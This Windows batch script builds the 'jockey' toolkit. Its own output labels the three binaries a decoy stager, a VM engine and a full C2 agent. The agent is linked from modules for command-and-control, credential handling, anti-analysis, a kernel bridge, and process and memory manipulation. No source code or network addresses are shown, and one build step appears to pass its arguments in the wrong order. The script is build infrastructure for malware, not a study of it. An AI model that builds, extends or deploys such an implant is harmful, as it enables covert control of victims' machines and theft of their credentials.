@echo off
setlocal enabledelayedexpansion
echo compiling jockey userspace binaries...

set CFLAGS=/nologo /W3 /O2 /D_CRT_SECURE_NO_WARNINGS /D_WIN32_WINNT=0x0601 ^
 /DWIN32_LEAN_AND_MEAN /D_WINSOCK_DEPRECATED_NO_WARNINGS ^
 /Iinclude /Iplatform /Ikmod ^
 /FIstdlib.h /FIstring.h

if not exist obj mkdir obj
if not exist out mkdir out

echo.
echo ── [1/3] jockstrap.exe (decoy) ──────────────────────────────
call :cc_single src\jockstrap.c src\jockstrap.rc obj\jockstrap.obj || goto :fail
if not exist src\jockstrap.res rc.exe /fo src\jockstrap.res src\jockstrap.rc
cl /nologo kernel32.lib version.lib /Feout\jockstrap.exe obj\jockstrap.obj src\jockstrap.res
if errorlevel 1 goto :fail

echo.
echo ── [2/3] jockey_runner.exe (VM engine) ──────────────────────
call :cc src\jockey_runner.c || goto :fail
call :cc src\vm.c             || goto :fail
call :cc src\value.c          || goto :fail
call :cc src\loader.c         || goto :fail
call :cc src\builtins.c       || goto :fail
call :cc src\builtins\stub.c  || goto :fail

echo linking runner...
cl /nologo kernel32.lib /Feout\jockey_runner.exe ^
   obj\jockey_runner.obj obj\vm.obj obj\value.obj obj\loader.obj ^
   obj\builtins.obj obj\stub.obj
if errorlevel 1 goto :fail

echo.
echo ── [3/3] jockey_agent.exe (full agent) ──────────────────────
call :cc src\main.c                || goto :fail
call :cc src\vm.c                  || goto :fail
call :cc src\value.c               || goto :fail
call :cc src\loader.c              || goto :fail
call :cc src\agent.c               || goto :fail
call :cc src\agent_c2.c            || goto :fail
call :cc src\builtins.c            || goto :fail
call :cc src\kernel_bridge.c       || goto :fail
call :cc src\builtins\anti.c       || goto :fail
call :cc src\builtins\system.c     || goto :fail
call :cc src\builtins\fs.c         || goto :fail
call :cc src\builtins\process.c    || goto :fail
call :cc src\builtins\memory.c     || goto :fail
call :cc src\builtins\net.c        || goto :fail
call :cc src\builtins\cred.c       || goto :fail
call :cc src\builtins\kernel.c     || goto :fail
call :cc src\builtins\util.c       || goto :fail
call :cc src\builtins\pure.c       || goto :fail
call :cc src\builtins\crypto.c     || goto :fail
call :cc src\builtins\data.c       || goto :fail
call :cc src\platform\windows\platform.c || goto :fail

echo linking agent...
cl /nologo kernel32.lib advapi32.lib user32.lib ws2_32.lib iphlpapi.lib ^
   secur32.lib rpcrt4.lib psapi.lib netapi32.lib bcrypt.lib ^
   /Feout\jockey_agent.exe obj\main.obj obj\vm.obj obj\value.obj obj\loader.obj ^
   obj\agent.obj obj\agent_c2.obj obj\builtins.obj obj\kernel_bridge.obj ^
   obj\anti.obj obj\system.obj obj\fs.obj obj\process.obj obj\memory.obj ^
   obj\net.obj obj\cred.obj obj\kernel.obj obj\util.obj obj\pure.obj ^
   obj\crypto.obj obj\data.obj obj\platform.obj
if errorlevel 1 goto :fail

echo.
echo ── all binaries written to out\ ──────────────────────────────
echo   jockstrap.exe    decoy stager
echo   jockey_runner.exe VM engine
echo   jockey_agent.exe full C2 agent
echo.
echo done.
endlocal
exit /b 0

:cc
cl %CFLAGS% /Foobj\ /c %~1
exit /b %errorlevel%

:cc_single
cl %CFLAGS% /Fo%~2 /c %~1
exit /b %errorlevel%

:fail
echo.
echo *** BUILD FAILED -- fix the errors above and re-run ***
endlocal
exit /b 1
